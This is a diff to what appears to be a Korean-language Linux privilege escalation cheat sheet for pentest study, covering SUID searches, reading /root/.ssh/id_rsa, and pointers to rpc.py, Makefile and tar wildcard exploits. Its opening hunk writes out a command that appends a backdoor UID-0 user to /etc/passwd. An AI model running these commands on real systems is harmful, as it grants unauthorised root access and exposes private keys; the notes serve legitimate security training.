@@ -7,7 +7,7 @@ openssl passwd mrcake
 # Output: hKLD3431415ZE
 
 # /etc/passwd에 새로운 root 사용자 추가
-echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "root2:hKLD3431415ZE:0:0:root:/root:/bin/bash" >> /etc/passwd
 
 # root2로 전환
 su root2
@@ -85,6 +85,7 @@ lsmod
 ### SUID/SGID 파일 찾기
 ```bash
 find / -perm -4000 -type f 2>/dev/null
+find / -perm -6000 -type f 2>/dev/null
 ```
 
 ### Capabilities 확인
@@ -113,6 +114,7 @@ sudo -l
 # 현재 마운트된 파일시스템의 디스크 사용량 확인
 df -h
 ```
+<img width="689" height="248" alt="image" src="https://github.com/user-attachments/assets/96e0cff6-b9f2-4624-9c36-417a71ddac0c" />
 
 ```bash
 # 파일시스템의 내부 구조를 조작하거나 디버깅
@@ -127,13 +129,6 @@ cat /root/.ssh/id_rsa
 
 ---
 
-## Sudo Group
-```bash
-sudo su
-```
-
----
-
 ## rpc.py Exploit
 - https://github.com/abersheeran/rpc.py
 - https://www.exploit-db.com/exploits/50983
@@ -141,6 +136,8 @@ sudo su
 ---
 
 ## Makefile Privilege Escalation
+<img width="706" height="636" alt="image" src="https://github.com/user-attachments/assets/553e10b6-f5d7-4494-b3da-94c3167651d4" />
+
 - https://medium.com/@adamforsythebartlett/makefile-privilege-escalation-oscp-62ea2c666d23
 
 ---
@@ -163,14 +160,10 @@ ln -s /file/you/want/to/read root.txt
 ---
 
 ## Tar Wildcard Exploit
+<img width="675" height="350" alt="image" src="https://github.com/user-attachments/assets/af27b485-c6fb-4ab7-9b35-b2e20a5f01fa" />
+
 - https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
 
----
-
-## Sudoers 파일
-```bash
-user    ALL=(ALL:ALL) ALL
-```
 
 ---
 
